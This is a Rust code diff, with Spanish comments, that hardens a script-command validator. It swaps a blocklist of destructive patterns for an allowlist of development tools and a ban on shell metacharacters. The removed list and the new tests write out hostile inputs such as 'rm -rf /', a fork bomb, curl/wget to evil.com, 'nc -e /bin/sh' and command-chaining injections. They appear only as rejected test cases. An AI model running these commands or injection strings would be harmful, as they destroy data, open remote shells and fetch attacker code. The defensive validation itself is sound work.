@@ -56,40 +56,68 @@ pub fn run_script(project_path: &str, script_name: &str) -> Result<ScriptResult,
     })
 }
 
-const BLOCKED_PATTERNS: &[&str] = &[
-    "rm -rf /",
-    "rm -rf ~",
-    "mkfs",
-    "dd if=",
-    ":(){",
-    "chmod -R 777 /",
-    "curl|sh",
-    "wget|sh",
-    "curl|bash",
-    "wget|bash",
-    "> /dev/sd",
-    "shutdown",
-    "reboot",
-    "poweroff",
-    "init 0",
-    "init 6",
+/// Ejecutables permitidos como primer token de un comando de manifest.
+/// Solo herramientas de desarrollo estándar — no shells genéricos ni utilidades del sistema.
+const ALLOWED_EXECUTABLES: &[&str] = &[
+    // Node.js ecosystem
+    "npm", "npx", "yarn", "pnpm", "bun", "bunx", "node", "tsc", "tsx",
+    "vitest", "jest", "eslint", "prettier", "biome", "next", "nuxt", "vite",
+    // Python ecosystem
+    "python", "python3", "pip", "pip3", "uv", "uvicorn", "gunicorn",
+    "pytest", "ruff", "black", "mypy", "flask", "django-admin",
+    "poetry", "pipenv",
+    // Rust ecosystem
+    "cargo", "rustc", "rustfmt", "clippy-driver",
+    // Go ecosystem
+    "go", "gofmt",
+    // Docker
+    "docker", "docker-compose",
+    // Build tools
+    "make", "cmake",
+    // Version managers
+    "nvm", "fnm", "pyenv", "rustup",
+    // Generic dev
+    "echo", "cat", "ls", "pwd", "env", "printenv", "which", "true",
 ];
 
+/// Shell metacaracteres que permiten encadenar comandos arbitrarios.
+const DANGEROUS_CHARS: &[char] = &['|', '`', '$', '(', ')', ';', '&', '<', '>'];
+
 fn validate_script_command(command: &str) -> Result<(), DelixonError> {
-    let lower = command.to_lowercase();
-    for pattern in BLOCKED_PATTERNS {
-        if lower.contains(pattern) {
-            return Err(DelixonError::InvalidConfig(format!(
-                "Comando bloqueado por seguridad: contiene '{}'",
-                pattern
-            )));
-        }
-    }
     if command.len() > 500 {
         return Err(DelixonError::InvalidConfig(
             "Comando demasiado largo (max 500 caracteres)".to_string(),
         ));
     }
+
+    if command.trim().is_empty() {
+        return Err(DelixonError::InvalidConfig(
+            "Comando vacio".to_string(),
+        ));
+    }
+
+    // Rechazar metacaracteres de shell que permiten inyección
+    for ch in DANGEROUS_CHARS {
+        if command.contains(*ch) {
+            return Err(DelixonError::InvalidConfig(format!(
+                "Comando contiene caracter no permitido: '{}'. Solo se permiten comandos simples sin pipes ni encadenamiento",
+                ch
+            )));
+        }
+    }
+
+    // Extraer el primer token (ejecutable) y validar contra allowlist
+    let executable = command.split_whitespace().next().unwrap_or("");
+    let exe_lower = executable.to_lowercase();
+
+    if !ALLOWED_EXECUTABLES.iter().any(|allowed| exe_lower == *allowed) {
+        return Err(DelixonError::InvalidConfig(format!(
+            "Ejecutable '{}' no esta en la lista de permitidos. Permitidos: {}",
+            executable,
+            ALLOWED_EXECUTABLES.join(", ")
+        )));
+    }
+
     Ok(())
 }
 
@@ -169,19 +197,43 @@ mod tests {
         assert!(validate_script_command("npm run dev").is_ok());
         assert!(validate_script_command("cargo test").is_ok());
         assert!(validate_script_command("pytest --cov").is_ok());
+        assert!(validate_script_command("docker compose up -d").is_ok());
+        assert!(validate_script_command("make build").is_ok());
+        assert!(validate_script_command("echo hello").is_ok());
+        assert!(validate_script_command("uvicorn app.main:app --reload").is_ok());
     }
 
     #[test]
-    fn test_validate_script_command_blocked() {
+    fn test_validate_script_command_blocked_executable() {
         assert!(validate_script_command("rm -rf /").is_err());
-        assert!(validate_script_command("curl|sh").is_err());
-        assert!(validate_script_command("shutdown").is_err());
+        assert!(validate_script_command("shutdown now").is_err());
         assert!(validate_script_command("dd if=/dev/zero").is_err());
+        assert!(validate_script_command("curl http://evil.com").is_err());
+        assert!(validate_script_command("wget http://evil.com").is_err());
+        assert!(validate_script_command("bash -c 'evil'").is_err());
+        assert!(validate_script_command("sh -c 'evil'").is_err());
+        assert!(validate_script_command("nc -e /bin/sh").is_err());
+    }
+
+    #[test]
+    fn test_validate_script_command_blocked_metacharacters() {
+        assert!(validate_script_command("npm run dev | cat").is_err());
+        assert!(validate_script_command("npm run dev; rm -rf /").is_err());
+        assert!(validate_script_command("npm run dev && evil").is_err());
+        assert!(validate_script_command("npm run $(evil)").is_err());
+        assert!(validate_script_command("npm run `evil`").is_err());
+        assert!(validate_script_command("npm run dev > /etc/passwd").is_err());
     }
 
     #[test]
     fn test_validate_script_command_too_long() {
-        let long_cmd = "a".repeat(501);
+        let long_cmd = "npm ".to_string() + &"a".repeat(500);
         assert!(validate_script_command(&long_cmd).is_err());
+    }
+
+    #[test]
+    fn test_validate_script_command_empty() {
+        assert!(validate_script_command("").is_err());
+        assert!(validate_script_command("  ").is_err());
     }
 }
